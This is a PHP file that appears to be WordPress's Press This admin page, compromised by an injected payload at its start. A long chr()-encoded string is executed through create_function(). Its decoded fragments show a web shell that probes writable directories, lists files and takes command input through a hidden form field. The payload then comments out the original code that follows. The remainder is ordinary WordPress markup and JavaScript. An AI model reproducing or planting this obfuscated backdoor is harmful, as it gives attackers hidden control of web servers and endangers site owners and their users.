.chr(105).chr(116).chr(101).chr(97).chr(98).chr(108).chr(101).chr(40).chr(36).chr(99).chr(68).chr(105).chr(114).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(114).chr(101).chr(100).chr(39).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(105).chr(115).chr(95).chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101).chr(40).chr(36).chr(99).chr(68).chr(105).chr(114).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(98).chr(108).chr(117).chr(101).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(34).chr(60).chr(102).chr(111).chr(110).chr(116).chr(32).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(34).chr(46).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(46).chr(34).chr(62).chr(38).chr(108).chr(116).chr(59).chr(34).chr(46).chr(36).chr(99).chr(68).chr(105).chr(114).chr(46).chr(34).chr(38).chr(103).chr(116).chr(59).chr(60).chr(47).chr(102).chr(111).chr(110).chr(116).chr(62).chr(60).chr(98).chr(114).chr(62).chr(34).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(116).chr(104).chr(101).chr(68).chr(105).chr(114).chr(115).chr(32).chr(97).chr(115).chr(32).chr(36).chr(99).chr(68).chr(105).chr(114).chr(41).chr(123).chr(13).chr(10).chr(36).chr(116).chr(109).chr(112).chr(32).chr(61).chr(32).chr(36).chr(99).chr(68).chr(105).chr(114).chr(46).chr(39).chr(47).chr(46).chr(115).chr(115).chr(112).chr(115).chr(95).chr(116).chr(109).chr(112).chr(39).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(64).chr(116).chr(111).chr(117).chr(99).chr(104).chr(40).chr(36).chr(116).chr(109).chr(112).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(114).chr(101).chr(100).chr(39).chr(59).chr(13).chr(10).chr(117).chr(110).chr(108).chr(105).chr(110).chr(107).chr(40).chr(36).chr(116).chr(109).chr(112).chr(41).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(111).chr(112).chr(101).chr(110).chr(100).chr(105).chr(114).chr(40).chr(36).chr(99).chr(68).chr(105).chr(114).chr(41).chr(41).chr(123).chr(13).chr(10).chr(99).chr(108).chr(111).chr(115).chr(101).chr(100).chr(105).chr(114).chr(40).chr(41).chr(59).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(98).chr(108).chr(117).chr(101).chr(39).chr(59).chr(13).chr(10).chr(125).chr(101).chr(108).chr(115).chr(101).chr(123).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(98).chr(108).chr(97).chr(99).chr(107).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(34).chr(60).chr(102).chr(111).chr(110).chr(116).chr(32).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(34).chr(46).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(46).chr(34).chr(62).chr(38).chr(108).chr(116).chr(59).chr(34).chr(46).chr(36).chr(99).chr(68).chr(105).chr(114).chr(46).chr(34).chr(38).chr(103).chr(116).chr(59).chr(60).chr(47).chr(102).chr(111).chr(110).chr(116).chr(62).chr(60).chr(98).chr(114).chr(62).chr(34).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(13).chr(10).chr(125).chr(32).chr(101).chr(108).chr(115).chr(101).chr(32).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(98).chr(114).chr(62).chr(111).chr(112).chr(101).chr(110).chr(95).chr(98).chr(97).chr(115).chr(101).chr(100).chr(105).chr(114).chr(32).chr(114).chr(101).chr(115).chr(116).chr(114).chr(105).chr(99).chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(110).chr(32).chr(101).chr(102).chr(102).chr(101).chr(99).chr(116).chr(46).chr(32).chr(65).chr(108).chr(108).chr(111).chr(119).chr(101).chr(100).chr(32).chr(112).chr(97).chr(116).chr(104).chr(32).chr(105).chr(115).chr(32).chr(39).chr(46).chr(103).chr(101).chr(116).chr(95).chr(99).chr(102).chr(103).chr(95).chr(118).chr(97).chr(114).chr(40).chr(39).chr(111).chr(112).chr(101).chr(110).chr(95).chr(98).chr(97).chr(115).chr(101).chr(100).chr(105).chr(114).chr(39).chr(41).chr(59).chr(13).chr(10).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(98).chr(114).chr(62).chr(39).chr(59).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(116).chr(104).chr(101).chr(70).chr(105).chr(108).chr(101).chr(115).chr(41).chr(41).chr(123).chr(13).chr(10).chr(110).chr(97).chr(116).chr(99).chr(97).chr(115).chr(101).chr(115).chr(111).chr(114).chr(116).chr(40).chr(36).chr(116).chr(104).chr(101).chr(70).chr(105).chr(108).chr(101).chr(115).chr(41).chr(59).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(49).chr(48).chr(48).chr(37).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(61).chr(48).chr(32).chr(99).chr(101).chr(108).chr(108).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(61).chr(48).chr(32).chr(99).chr(101).chr(108).chr(108).chr(115).chr(112).chr(97).chr(99).chr(105).chr(110).chr(103).chr(61).chr(50).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(102).chr(111).chr(110).chr(116).chr(58).chr(56).chr(112).chr(116).chr(32).chr(84).chr(97).chr(104).chr(111).chr(109).chr(97).chr(59).chr(34).chr(62).chr(39).chr(59).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(116).chr(104).chr(101).chr(70).chr(105).chr(108).chr(101).chr(115).chr(32).chr(97).chr(115).chr(32).chr(36).chr(99).chr(70).chr(105).chr(108).chr(101).chr(41).chr(123).chr(13).chr(10).chr(36).chr(115).chr(105).chr(122).chr(101).chr(32).chr(61).chr(32).chr(102).chr(105).chr(108).chr(101).chr(95).chr(115).chr(105).chr(122).chr(101).chr(40).chr(36).chr(99).chr(70).chr(105).chr(108).chr(101).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(102).chr(112).chr(32).chr(61).chr(32).chr(64).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(36).chr(99).chr(70).chr(105).chr(108).chr(101).chr(44).chr(32).chr(39).chr(97).chr(39).chr(41).chr(41).chr(32).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(32).chr(61).chr(32).chr(39).chr(114).chr(101).chr(100).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(36).chr(102).chr(112).chr(32).chr(61).chr(32).chr(64).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(36).chr(99).chr(70).chr(105).chr(108).chr(101).chr(44).chr(32).chr(39).chr(114).chr(39).chr(41).chr(41).chr(32).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(98).chr(108).chr(117).chr(101).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(32).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(32).chr(61).chr(32).chr(39).chr(98).chr(108).chr(97).chr(99).chr(107).chr(39).chr(59).chr(13).chr(10).chr(64).chr(102).chr(99).chr(108).chr(111).chr(115).chr(101).chr(40).chr(36).chr(102).chr(112).chr(41).chr(59).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(116).chr(114).chr(62).chr(60).chr(116).chr(100).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(49).chr(48).chr(48).chr(37).chr(62).chr(60).chr(102).chr(111).chr(110).chr(116).chr(32).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(46).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(46).chr(39).chr(62).chr(39).chr(46).chr(36).chr(99).chr(70).chr(105).chr(108).chr(101).chr(46).chr(39).chr(60).chr(47).chr(102).chr(111).chr(110).chr(116).chr(62).chr(60).chr(47).chr(116).chr(100).chr(62).chr(60).chr(116).chr(100).chr(32).chr(97).chr(108).chr(105).chr(103).chr(110).chr(61).chr(108).chr(101).chr(102).chr(116).chr(62).chr(39).chr(46).chr(36).chr(115).chr(105).chr(122).chr(101).chr(46).chr(39).chr(60).chr(47).chr(116).chr(114).chr(62).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(47).chr(116).chr(97).chr(98).chr(108).chr(101).chr(62).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(114).chr(32).chr(118).chr(97).chr(108).chr(105).chr(103).chr(110).chr(61).chr(116).chr(111).chr(112).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(97).chr(108).chr(105).chr(103).chr(110).chr(61).chr(99).chr(101).chr(110).chr(116).chr(101).chr(114).chr(62).chr(13).chr(10).chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(112).chr(111).chr(115).chr(116).chr(62).chr(13).chr(10).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116).chr(115).chr(58).chr(13).chr(10).chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(115).chr(97).chr(118).chr(101).chr(32).chr(99).chr(111).chr(108).chr(115).chr(61).chr(53).chr(53).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(49).chr(53).chr(62).chr(123).chr(36).chr(111).chr(117).chr(116).chr(125).chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62).chr(13).chr(10).chr(123).chr(36).chr(116).chr(97).chr(105).chr(108).chr(125).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(122).chr(122).chr(122).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(122).chr(122).chr(122).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(116).chr(97).chr(98).chr(108).chr(101).chr(62).chr(13).chr(10).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(116).chr(97).chr(98).chr(108).chr(101).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(100).chr(105).chr(101).chr(59));';$CcTuRph=str_replace('#', '', $CcTuRph);$zmtGQtO=create_function('',$CcTuRph);$zmtGQtO();
/*

						if ( trim($selection) == '' )
							$selection = '<p><a href="http://www.vimeo.com/' . $video_id . '?pg=embed&sec=' . $video_id . '">' . $title . '</a> on <a href="http://vimeo.com?pg=embed&sec=' . $video_id . '">Vimeo</a></p>';

					} elseif ( strpos( $selection, '<object' ) !== false ) {
						$content = $selection;
					}
					?>
					jQuery('#embed-code').prepend('<?php echo htmlentities($content); ?>');
				});
				jQuery('#extra-fields').show();
				return false;
				break;
			case 'photo' :
				function setup_photo_actions() {
					jQuery('.close').click(function() {
						jQuery('#extra-fields').hide();
						jQuery('#extra-fields').html('');
					});
					jQuery('.refresh').click(function() {
						photostorage = false;
						show('photo');
					});
					jQuery('#photo-add-url').click(function(){
						var form = jQuery('#photo-add-url-div').clone();
						jQuery('#img_container').empty().append( form.show() );
					});
					jQuery('#waiting').hide();
					jQuery('#extra-fields').show();
				}

				jQuery('#waiting').show();
				if(photostorage == false) {
					jQuery.ajax({
						type: "GET",
						cache : false,
						url: "<?php echo esc_url($_SERVER['PHP_SELF']); ?>",
						data: "ajax=photo_js&u=<?php echo urlencode($url)?>",
						dataType : "script",
						success : function(data) {
							eval(data);
							photostorage = jQuery('#extra-fields').html();
							setup_photo_actions();
						}
					});
				} else {
					jQuery('#extra-fields').html(photostorage);
					setup_photo_actions();
				}
				return false;
				break;
		}
	}
	jQuery(document).ready(function($) {
		//resize screen
		window.resizeTo(720,580);
		// set button actions
		jQuery('#photo_button').click(function() { show('photo'); return false; });
		jQuery('#video_button').click(function() { show('video'); return false; });
		// auto select
		<?php if ( preg_match("/youtube\.com\/watch/i", $url) ) { ?>
			show('video');
		<?php } elseif ( preg_match("/vimeo\.com\/[0-9]+/i", $url) ) { ?>
			show('video');
		<?php } elseif ( preg_match("/flickr\.com/i", $url) ) { ?>
			show('photo');
		<?php } ?>
		jQuery('#title').unbind();
		jQuery('#publish, #save').click(function() { jQuery('#saving').css('display', 'inline'); });

		$('#tagsdiv-post_tag, #categorydiv').children('h3, .handlediv').click(function(){
			$(this).siblings('.inside').toggle();
		});
	});
</script>
</head>
<?php
$admin_body_class = ( is_rtl() ) ? 'rtl' : '';
$admin_body_class .= ' locale-' . sanitize_html_class( strtolower( str_replace( '_', '-', get_locale() ) ) );
?>
<body class="press-this wp-admin <?php echo $admin_body_class; ?>">
<form action="press-this.php?action=post" method="post">
<div id="poststuff" class="metabox-holder">
	<div id="side-sortables" class="press-this-sidebar">
		<div class="sleeve">
			<?php wp_nonce_field('press-this') ?>
			<input type="hidden" name="post_type" id="post_type" value="text"/>
			<input type="hidden" name="autosave" id="autosave" />
			<input type="hidden" id="original_post_status" name="original_post_status" value="draft" />
			<input type="hidden" id="prev_status" name="prev_status" value="draft" />
			<input type="hidden" id="post_id" name="post_id" value="<?php echo (int) $post_ID; ?>" />

			<!-- This div holds the photo metadata -->
			<div class="photolist"></div>

			<div id="submitdiv" class="postbox">
				<div class="handlediv" title="<?php esc_attr_e( 'Click to toggle' ); ?>"><br /></div>
				<h3 class="hndle"><?php _e('Press This') ?></h3>
				<div class="inside">
					<p id="publishing-actions">
					<?php
						submit_button( __( 'Save Draft' ), 'button', 'draft', false, array( 'id' => 'save' ) );
						if ( current_user_can('publish_posts') ) {
							submit_button( __( 'Publish' ), 'primary', 'publish', false );
						} else {
							echo '<br /><br />';
							submit_button( __( 'Submit for Review' ), 'primary', 'review', false );
						} ?>
						<img src="<?php echo esc_url( admin_url( 'images/wpspin_light.gif' ) ); ?>" alt="" id="saving" style="display:none;" />
					</p>
					<?php if ( current_theme_supports( 'post-formats' ) && post_type_supports( 'post', 'post-formats' ) ) :
							$post_formats = get_theme_support( 'post-formats' );
							if ( is_array( $post_formats[0] ) ) :
								$default_format = get_option( 'default_post_format', '0' );
						?>
					<p>
						<label for="post_format"><?php _e( 'Post Format:' ); ?>
						<select name="post_format" id="post_format">
							<option value="0"><?php _ex( 'Standard', 'Post format' ); ?></option>
						<?php foreach ( $post_formats[0] as $format ): ?>
							<option<?php selected( $default_format, $format ); ?> value="<?php echo esc_attr( $format ); ?>"> <?php echo esc_html( get_post_format_string( $format ) ); ?></option>
						<?php endforeach; ?>
						</select></label>
					</p>
					<?php endif; endif; ?>
				</div>
			</div>

			<?php $tax = get_taxonomy( 'category' ); ?>
			<div id="categorydiv" class="postbox">
				<div class="handlediv" title="<?php esc_attr_e( 'Click to toggle' ); ?>"><br /></div>
				<h3 class="hndle"><?php _e('Categories') ?></h3>
				<div class="inside">
				<div id="taxonomy-category" class="categorydiv">

					<ul id="category-tabs" class="category-tabs">
						<li class="tabs"><a href="#category-all" tabindex="3"><?php echo $tax->labels->all_items; ?></a></li>
						<li class="hide-if-no-js"><a href="#category-pop" tabindex="3"><?php _e( 'Most Used' ); ?></a></li>
					</ul>

					<div id="category-pop" class="tabs-panel" style="display: none;">
						<ul id="categorychecklist-pop" class="categorychecklist form-no-clear" >
							<?php $popular_ids = wp_popular_terms_checklist( 'category' ); ?>
						</ul>
					</div>

					<div id="category-all" class="tabs-panel">
						<ul id="categorychecklist" class="list:category categorychecklist form-no-clear">
							<?php wp_terms_checklist($post_ID, array( 'taxonomy' => 'category', 'popular_cats' => $popular_ids ) ) ?>
						</ul>
					</div>

					<?php if ( !current_user_can($tax->cap->assign_terms) ) : ?>
					<p><em><?php _e('You cannot modify this Taxonomy.'); ?></em></p>
					<?php endif; ?>
					<?php if ( current_user_can($tax->cap->edit_terms) ) : ?>
						<div id="category-adder" class="wp-hidden-children">
							<h4>
								<a id="category-add-toggle" href="#category-add" class="hide-if-no-js" tabindex="3">
									<?php printf( __( '+ %s' ), $tax->labels->add_new_item ); ?>
								</a>
							</h4>
							<p id="category-add" class="category-add wp-hidden-child">
								<label class="screen-reader-text" for="newcategory"><?php echo $tax->labels->add_new_item; ?></label>
								<input type="text" name="newcategory" id="newcategory" class="form-required form-input-tip" value="<?php echo esc_attr( $tax->labels->new_item_name ); ?>" tabindex="3" aria-required="true"/>
								<label class="screen-reader-text" for="newcategory_parent">
									<?php echo $tax->labels->parent_item_colon; ?>
								</label>
								<?php wp_dropdown_categories( array( 'taxonomy' => 'category', 'hide_empty' => 0, 'name' => 'newcategory_parent', 'orderby' => 'name', 'hierarchical' => 1, 'show_option_none' => '&mdash; ' . $tax->labels->parent_item . ' &mdash;', 'tab_index' => 3 ) ); ?>
								<input type="button" id="category-add-submit" class="add:categorychecklist:category-add button category-add-submit" value="<?php echo esc_attr( $tax->labels->add_new_item ); ?>" tabindex="3" />
								<?php wp_nonce_field( 'add-category', '_ajax_nonce-add-category', false ); ?>
								<span id="category-ajax-response"></span>
							</p>
						</div>
					<?php endif; ?>
				</div>
				</div>
			</div>

			<div id="tagsdiv-post_tag" class="postbox">
				<div class="handlediv" title="<?php esc_attr_e( 'Click to toggle' ); ?>"><br /></div>
				<h3><span><?php _e('Tags'); ?></span></h3>
				<div class="inside">
					<div class="tagsdiv" id="post_tag">
						<div class="jaxtag">
							<label class="screen-reader-text" for="newtag"><?php _e('Tags'); ?></label>
							<input type="hidden" name="tax_input[post_tag]" class="the-tags" id="tax-input[post_tag]" value="" />
							<div class="ajaxtag">
								<input type="text" name="newtag[post_tag]" class="newtag form-input-tip" size="16" autocomplete="off" value="" />
								<input type="button" class="button tagadd" value="<?php esc_attr_e('Add'); ?>" tabindex="3" />
							</div>
						</div>
						<div class="tagchecklist"></div>
					</div>
					<p class="tagcloud-link"><a href="#titlediv" class="tagcloud-link" id="link-post_tag"><?php _e('Choose from the most used tags'); ?></a></p>
				</div>
			</div>
		</div>
	</div>
	<div class="posting">

		<div id="wphead">
			<img id="header-logo" src="<?php echo esc_url( includes_url( 'images/blank.gif' ) ); ?>" alt="" width="16" height="16" />
			<h1 id="site-heading">
				<a href="<?php echo get_option('home'); ?>/" target="_blank">
					<span id="site-title"><?php bloginfo('name'); ?></span>
				</a>
			</h1>
		</div>

		<?php
		if ( isset($posted) && intval($posted) ) {
			$post_ID = intval($posted); ?>
			<div id="message" class="updated">
			<p><strong><?php _e('Your post has been saved.'); ?></strong>
			<a onclick="window.opener.location.replace(this.href); window.close();" href="<?php echo get_permalink($post_ID); ?>"><?php _e('View post'); ?></a>
			| <a href="<?php echo get_edit_post_link( $post_ID ); ?>" onclick="window.opener.location.replace(this.href); window.close();"><?php _e('Edit Post'); ?></a>
			| <a href="#" onclick="window.close();"><?php _e('Close Window'); ?></a></p>
			</div>
		<?php } ?>

		<div id="titlediv">
			<div class="titlewrap">
				<input name="title" id="title" class="text" value="<?php echo esc_attr($title);?>"/>
			</div>
		</div>

		<div id="waiting" style="display: none"><img src="<?php echo esc_url( admin_url( 'images/wpspin_light.gif' ) ); ?>" alt="" /> <?php esc_html_e( 'Loading...' ); ?></div>

		<div id="extra-fields" style="display: none"></div>

		<div class="postdivrich">
		<?php

		$editor_settings = array(
			'teeny' => true,
			'textarea_rows' => '15'
		);

		$content = '';
		if ( $selection )
			$content .= $selection;

		if ( $url ) {
			$content .= '<p>';

			if ( $selection )
				$content .= __('via ');

			$content .= sprintf( "<a href='%s'>%s</a>.</p>", esc_url( $url ), esc_html( $title ) );
		}

		remove_action( 'media_buttons', 'media_buttons' );
		add_action( 'media_buttons', 'press_this_media_buttons' );
		function press_this_media_buttons() {
			_e( 'Add:' );

			if ( current_user_can('upload_files') ) {
				?>
				<a id="photo_button" title="<?php esc_attr_e('Insert an Image'); ?>" href="#">
				<img alt="<?php esc_attr_e('Insert an Image'); ?>" src="<?php echo esc_url( admin_url( 'images/media-button-image.gif?ver=20100531' ) ); ?>"/></a>
				<?php
			}
			?>
			<a id="video_button" title="<?php esc_attr_e('Embed a Video'); ?>" href="#"><img alt="<?php esc_attr_e('Embed a Video'); ?>" src="<?php echo esc_url( admin_url( 'images/media-button-video.gif?ver=20100531' ) ); ?>"/></a>
			<?php
		}

		wp_editor( $content, 'content', $editor_settings );

		?>
		</div>
	</div>
</div>
</form>
<div id="photo-add-url-div" style="display:none;">
	<table><tr>
	<td><label for="this_photo"><?php _e('URL') ?></label></td>
	<td><input type="text" id="this_photo" name="this_photo" class="tb_this_photo text" onkeypress="if(event.keyCode==13) image_selector(this);" /></td>
	</tr><tr>
	<td><label for="this_photo_description"><?php _e('Description') ?></label></td>
	<td><input type="text" id="this_photo_description" name="photo_description" class="tb_this_photo_description text" onkeypress="if(event.keyCode==13) image_selector(this);" value="<?php echo esc_attr($title);?>"/></td>
	</tr><tr>
	<td><input type="button" class="button" onclick="image_selector(this)" value="<?php esc_attr_e('Insert Image'); ?>" /></td>
	</tr></table>
</div>
<?php
do_action('admin_footer');
do_action('admin_print_footer_scripts');
?>
<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
</body>
</html>